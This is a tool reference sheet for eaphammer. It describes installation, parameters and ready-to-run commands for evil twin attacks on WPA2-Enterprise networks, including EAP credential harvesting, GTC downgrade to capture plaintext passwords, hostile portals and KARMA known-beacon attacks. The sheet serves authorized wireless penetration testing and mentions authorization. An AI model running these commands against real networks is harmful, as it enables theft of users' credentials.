# eaphammer

- **Category**: Wireless / WPA Enterprise Attacks
- **Risk Level**: 🔴 Critical

---

## Description

eaphammer is a toolkit for targeted evil twin attacks against WPA2-Enterprise networks. It creates a rogue access point with a built-in RADIUS server to harvest EAP credentials from connecting clients. Supports GTC downgrade attacks, hostile portal attacks, credential relay, and KARMA-style known-beacon attacks.

## Installation

```bash
sudo apt install eaphammer

git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer
sudo ./kali-setup
```

## Parameter Reference

| Parameter | Description |
|-----------|-------------|
| `-i, --interface <iface>` | The phy interface on which to create the AP |
| `--essid <ssid>` | Specify access point ESSID |
| `--channel <ch>` | Specify access point channel (default: 1) |
| `--auth <type>` | Authentication type (open, owe, wpa-psk, wpa-eap) |
| `--creds` | Harvest EAP creds using evil twin attack |
| `--hostile-portal` | Force clients to connect to hostile portal |
| `--captive-portal` | Enable captive portal |
| `--negotiate <method>` | Specify EAP negotiation approach (balanced, speed, weakest, gtc-downgrade, manual) |
| `--known-beacons` | Enable persistent known beacons attack |
| `--known-ssids-file <file>` | Wordlist to use with the --known-beacons feature |
| `--mac-whitelist <file>` | MAC address whitelist |
| `--pmkid` | Clientless PSK attack (PMKID capture) |

## Common Commands

### Scenario 1: Basic EAP credential harvest

```bash
# Create evil twin targeting WPA-Enterprise network
sudo eaphammer --interface wlan0 --essid "CorpWiFi" --channel 6 \
  --auth wpa-eap --creds
```

### Scenario 2: GTC downgrade attack

```bash
# Force GTC downgrade to capture plaintext credentials
sudo eaphammer --interface wlan0 --essid "CorpWiFi" --channel 6 \
  --auth wpa-eap --creds --negotiate gtc-downgrade
```

### Scenario 3: Hostile portal

```bash
# Serve hostile portal for credential harvesting
sudo eaphammer --interface wlan0 --essid "CorpWiFi" --channel 6 \
  --auth wpa-eap --hostile-portal
```

### Scenario 4: KARMA attack with known beacons

```bash
# Respond to all probe requests (known-beacons mode)
sudo eaphammer --interface wlan0 --auth wpa-eap --creds --known-beacons

# Use custom SSID list
sudo eaphammer --interface wlan0 --auth wpa-eap --creds \
  --known-ssids-file /tmp/ssid_list.txt
```

## Notes & Tips

1. Requires explicit authorization — rogue AP attacks can intercept credentials from unintended clients
2. Two wireless adapters recommended: one for the rogue AP, one for Deauth
3. GTC downgrade is effective because many supplicants auto-accept GTC without user warning
4. Captured credentials include EAP identity, challenge/response pairs, and sometimes plaintext passwords
5. Test in an isolated environment to avoid disrupting production wireless networks

---

## Official References

- [eaphammer (GitHub)](https://github.com/s0lst1c3/eaphammer)
- [eaphammer — Kali Tools](https://www.kali.org/tools/eaphammer/)
